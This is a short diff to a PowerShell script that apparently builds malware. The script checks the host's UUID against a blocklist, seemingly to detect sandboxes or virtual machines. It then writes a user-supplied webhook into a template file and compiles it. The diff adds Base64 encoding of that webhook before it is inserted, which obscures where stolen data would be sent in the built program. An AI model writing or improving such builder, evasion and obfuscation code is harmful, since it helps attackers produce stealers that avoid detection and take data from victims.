@@ -1,4 +1,16 @@
 # Lấy UUID của hệ thống
+function Encode-Base64 {
+    param (
+        [Parameter(Mandatory=$true)]
+        [string]$Text
+    )
+
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Text)
+    $base64 = [Convert]::ToBase64String($bytes)
+    return $base64
+}
+
+
 $UUID = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
 
 # Danh sách UUID không hợp lệ
@@ -52,7 +64,8 @@ $button.Add_Click({
 
         # Read the file content and replace placeholder
         $content = Get-Content $filePath -Raw
-        $newContent = $content -replace 'YOUR_WEBHOOK_HERE2', $webhook
+        $webhookencode = Encode-Base64 -Text $webhook
+        $newContent = $content -replace 'YOUR_WEBHOOK_HERE2', $webhookencode
         Set-Content -Path $filePath -Value $newContent
 
         # Path to the complie.exe executable
